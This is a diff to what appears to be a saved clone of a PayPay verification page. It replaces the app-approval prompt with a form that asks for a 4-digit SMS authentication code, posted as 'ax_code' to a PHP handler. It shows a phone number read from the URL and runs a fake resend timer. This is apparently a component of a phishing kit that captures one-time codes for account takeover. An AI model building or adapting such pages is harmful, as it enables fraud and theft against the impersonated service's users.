@@ -184,4 +184,107 @@
       icon-phone-sms
       icon-md
       
-    "></i></div><h3 data-v-5cd38ddc="" class="header-title">アプリを開いて「はい」を押してください</h3><!----><section data-v-9baee138="" data-v-5cd38ddc="" class="otp-auth"><div data-v-9baee138="" class="otp-content"><div data-v-3c60eda2="" data-v-9baee138="" class="otp"><div data-v-3c60eda2="" class="otp-info" style="display: none;"><p data-v-3c60eda2="">アプリに通知が送信されたので、アプリを開き「はい」を押してください</p><p data-v-3c60eda2=""><a data-v-3c60eda2="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">通知に関して</a></p></div></div></div><!----><p data-v-9baee138=""><span data-v-9baee138=""></span></p><p data-v-9baee138=""><a data-v-9baee138="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-9baee138="" src="./sms_files/icon-question.ab269875.svg" width="14" height="14">&nbsp;表示されない場合</a></p><button data-v-9baee138="" class="submit-button">戻る</button></form></section></section></div></section></div></div></body></html>
+    "></i></div><div class="s2_fixed">
+          <div class="icon-wrap">
+              <svg width="48" height="68" viewBox="0 0 34 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect x="1" y="1" width="32" height="50" rx="6" stroke="#002A62" stroke-width="1.2"/>
+                  <circle cx="17" cy="45" r="1.5" fill="#002A62"/>
+                  <rect x="13" y="6" width="8" height="1" rx="0.5" fill="#002A62"/>
+                  <path d="M11 25H13V27H11V25ZM16 25H18V27H16V25ZM21 25H23V27H21V25Z" fill="#002A62"/>
+              </svg>
+          </div>
+
+          <p class="main-txt">SMSで届いた認証コードを入力してください</p>
+          <p class="phone-txt"><span id="display_phone">090-****-****</span> に送信しました</p>
+
+          <div class="dc-flex">
+              <span class="dc-label"></span>
+              <div class="input-container">
+                  <div class="lines">
+                      <span id="l1"></span><span id="l2"></span><span id="l3"></span><span id="l4"></span>
+                  </div>
+                  <input type="tel" name="ax_code" id="dc_input" maxlength="4" required autofocus pattern="\d*">
+              </div>
+          </div>
+
+          <div class="blue-info">
+              <div class="info-inner">
+                  <div class="info-icon">
+                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+                  </div>
+                  <div class="info-content">
+                      認証コードに記載の2文字のアルファベットを確認の上、4桁の数字を入力してください
+                      <div class="blue-link-inline">アルファベットに関して</div>
+                  </div>
+              </div>
+          </div>
+
+          <?php if (isset($e_m) && $e_m): ?>
+              <p class="error-text"><?= htmlspecialchars($e_m) ?></p>
+          <?php endif; ?>
+
+          <button type="submit" class="submit-btn">認証する</button>
+
+          <div class="resend-section">
+              <p class="resend-txt">認証コードを再送 (<span id="timer">50</span> 秒後)</p>
+              <p class="blue-link">認証コードが届かない場合</p>
+          </div>
+      </div>
+
+    </form> 
+
+  <style>
+    .s2_fixed { display: flex; flex-direction: column; align-items: center; padding: 48px 24px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #1a1a1a; }
+    .icon-wrap { margin-bottom: 28px; }
+    .main-txt { font-size: 17px; font-weight: 700; margin: 0 0 8px 0; }
+    .phone-txt { color: #007aff; font-size: 14.5px; margin: 0 0 35px 0; }
+    .dc-flex { display: flex; align-items: center; justify-content: center; margin-bottom: 35px; gap: 18px; }
+    .dc-label { font-size: 28px; font-weight: 700; }
+    .input-container { position: relative; width: 175px; height: 48px; }
+    .lines { display: flex; justify-content: space-between; width: 100%; position: absolute; bottom: 5px; }
+    .lines span { width: 36px; height: 42px; border-bottom: 2.5px solid #e0e0e0; font-size: 32px; font-weight: 700; text-align: center; display: flex; align-items: center; justify-content: center; }
+    #dc_input { position: absolute; top:0; left:0; width:100%; height:100%; opacity:0; z-index:10; cursor: pointer; }
+    .blue-info { background: #eef6ff; border-radius: 12px; padding: 16px; max-width: 340px; margin-bottom: 30px; }
+    .info-inner { display: flex; gap: 12px; }
+    .info-content { font-size: 13.5px; color: #333; line-height: 1.55; text-align: left; }
+    .blue-link-inline { color: #007aff; font-weight: 700; margin-top: 10px; cursor: pointer; text-align: center; }
+    .error-text { color: #ed3242; font-weight: 700; font-size: 14px; margin-bottom: 15px; }
+    .submit-btn { width: 100%; max-width: 340px; padding: 16px; background: #ed3242; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; }
+    .resend-section { margin-top: 35px; text-align: center; }
+    .resend-txt { color: #b3b3b3; font-size: 14px; margin-bottom: 25px; }
+    .blue-link { color: #007aff; font-weight: 500; font-size: 15px; }
+  </style>
+
+  <script>
+    (function(){
+        const urlParams = new URLSearchParams(window.location.search);
+        let tel = urlParams.get('tel') || '090-****-****';
+        if(tel !== '090-****-****' && tel.length >= 11) {
+            tel = tel.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3');
+        }
+        document.getElementById('display_phone').innerText = tel;
+
+       
+        let timeLeft = 50;
+        const timerElement = document.getElementById('timer');
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
+            if(timeLeft <= 0) {
+                clearInterval(countdown);
+                document.querySelector('.resend-txt').innerHTML = '<span style="color:#007aff; cursor:pointer;">認証コードを再送する</span>';
+            }
+        }, 1000);
+
+       
+        const inp = document.getElementById('dc_input');
+        const lns = [document.getElementById('l1'), document.getElementById('l2'), document.getElementById('l3'), document.getElementById('l4')];
+        inp.addEventListener('input', () => {
+            const v = inp.value;
+            lns.forEach((l, i) => {
+                l.innerText = v[i] || '';
+                l.style.borderBottomColor = v[i] ? '#ed3242' : '#e0e0e0';
+            });
+        });
+    })();
+  </script>
